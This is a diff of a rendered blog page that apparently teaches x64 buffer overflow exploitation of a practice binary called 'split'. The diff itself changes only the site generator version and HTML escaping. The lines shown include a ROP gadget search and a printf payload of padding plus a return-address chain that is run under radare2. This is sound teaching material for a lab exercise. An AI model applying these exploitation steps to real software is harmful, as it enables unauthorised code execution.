@@ -93,7 +93,7 @@
 <script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
 
 
-<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.85.0" />
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.96.0" />
     
 
     
@@ -313,7 +313,7 @@
 <p>A second aspect of x64 exploitation is that function parameters are being passed using the <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8D</code> and <code>R9D</code> <a href="https://www.felixcloutier.com/x86/ret">registers</a>. All remaining parameters are passed using the stack. This is different than the x86 semantics where parameters are being passed using the stack.</p>
 <p>This makes x64 exploitation a bit more difficult if you want to call a function that&rsquo;s already existing because function parameters have to be loaded into the respective registers prior to executing as function in the target process. For this, a very small ROP payload can be used to populate the required registers first and <code>ret</code>urn or jump to the payload afterwards.</p>
 <p>To accomplish this, the <code>/R</code> search of <code>r2</code> can be used, e.g. like this:</p>
-<pre><code>r2 split -c &quot;/R pop rdi; ret&quot;
+<pre tabindex="0"><code>r2 split -c &#34;/R pop rdi; ret&#34;
   0x00400883                 5f  pop rdi
   0x00400884                 c3  ret
 </code></pre><p>This is a ROP gadget that can be used to leverage an exploit.</p>
@@ -333,7 +333,7 @@
 </ol>
 <h1 id="exploitation">Exploitation</h1>
 <p>You can use <code>pwntools</code> to exploit the binary or a simple <code>printf</code> with an <code>r2</code> profile:</p>
-<pre><code>$ printf &quot;`python2.7 -c 'import sys; sys.stdout.write(&quot;A&quot; * 40)'`\x83\x08\x40\x00\x00\x00\x00\x00\x60\x10\x60\x00\x00\x00\x00\x00\xe0\x05\x40\x00\x00\x00\x00\x00&quot; &gt; /tmp/in
+<pre tabindex="0"><code>$ printf &#34;`python2.7 -c &#39;import sys; sys.stdout.write(&#34;A&#34; * 40)&#39;`\x83\x08\x40\x00\x00\x00\x00\x00\x60\x10\x60\x00\x00\x00\x00\x00\xe0\x05\x40\x00\x00\x00\x00\x00&#34; &gt; /tmp/in
 
 $ cat &gt; /tmp/profile.rr2 &lt;&lt; EOF
 #!/usr/bin/rarun2
@@ -341,7 +341,7 @@ program=./split
 stdin=/tmp/in
 EOF
 
-$ r2 -e dbg.profile=/tmp/profile.rr2 -d split -c &quot;dc&quot;
+$ r2 -e dbg.profile=/tmp/profile.rr2 -d split -c &#34;dc&#34;
 </code></pre><p>This video demonstrates the exploitation process:</p>
 <video width="100%" height="100%" controls preload>
     <source src="/img/x64-bof/r2.webm"></source>
